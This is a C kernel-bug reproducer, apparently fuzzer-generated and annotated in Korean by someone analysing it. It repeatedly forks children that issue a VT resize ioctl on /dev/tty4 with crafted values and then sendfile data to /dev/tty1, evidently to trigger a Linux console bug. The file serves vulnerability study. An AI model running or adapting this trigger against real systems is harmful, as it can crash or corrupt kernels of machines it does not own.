#define _GNU_SOURCE 

#include <errno.h>
#include <stdarg.h>
#include <sys/prctl.h>
#include <dirent.h>
#include <stdbool.h>
#include <stdint.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

static uint64_t current_time_ms(void)
{
	struct timespec ts;
	if (clock_gettime(CLOCK_MONOTONIC, &ts))
		exit(1);
	return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static bool write_file(const char* file, const char* what, ...)
{
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);
	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		int err = errno;
		close(fd);
		errno = err;
		return false;
	}
	close(fd);
	return true;
}

static void kill_and_wait(int pid, int* status)
{
	kill(-pid, SIGKILL);
	kill(pid, SIGKILL);
	int i;
	for (i = 0; i < 100; i++) {
		if (waitpid(-1, status, WNOHANG | __WALL) == pid)
			return;
		usleep(1000);
	}
	DIR* dir = opendir("/sys/fs/fuse/connections");
	if (dir) {
		for (;;) {
			struct dirent* ent = readdir(dir);
			if (!ent)
				break;
			if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
				continue;
			char abort[300];
			snprintf(abort, sizeof(abort), "/sys/fs/fuse/connections/%s/abort", ent->d_name);
			int fd = open(abort, O_WRONLY);
			if (fd == -1) {
				continue;
			}
			if (write(fd, abort, 1) < 0) {
			}
			close(fd);
		}
		closedir(dir);
	} else {
	}
	while (waitpid(-1, status, __WALL) != pid) {
	}
}

static void setup_test()
{
	prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
	setpgrp();
	write_file("/proc/self/oom_score_adj", "1000");
}

static void execute_one(void);

static void loop(void)
{
	int iter;
	for (iter = 0;; iter++) {
		int pid = fork();
		if (pid < 0)
	        exit(1);
		if (pid == 0) {
			setup_test();
			execute_one();
			exit(0);
		}
		int status = 0;
		uint64_t start = current_time_ms();
		for (;;) {
			if (waitpid(-1, &status, WNOHANG | __WALL) == pid)
				break;
			usleep(1000);
			if (current_time_ms() - start < 5 * 1000)
				continue;
			kill_and_wait(pid, &status);
			break;
		}
	}
}

uint64_t r[3] = {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff};

void execute_one(void)
{
	intptr_t res = 0;
	r[0] = open("/dev/tty4", O_RDWR, 0);

	// struct?
    *(uint16_t*)0x200000c0 = 0x7fff;
    *(uint16_t*)0x200000c2 = 7;
    *(uint16_t*)0x200000c4 = 0x831;

	ioctl(r[0], 0x5609, 0x200000c0); // TCSBRK = 0x5409, 0x200은 뭘까? 5409|200이 아닐지도?
	// normal user는 ioctl 불가! 대안이 있을까?
	res = open("testfile", O_RDWR); // 파일 내용 의미 없는듯
	if (res != -1)
		r[1] = res;

	r[2] = open("/dev/tty1", O_RDWR, 0);
	//ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
	sendfile(r[2], r[1], 0, 0x100); // 크기는 시간의 차이, 내용은 상관 없음
}

int main(void)
{
	mmap((void*)0x20000000, 0x1000000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0);
	loop();
	return 0;
}

//scp vmware@192.168.209.129:/home/vmware/t.c t.c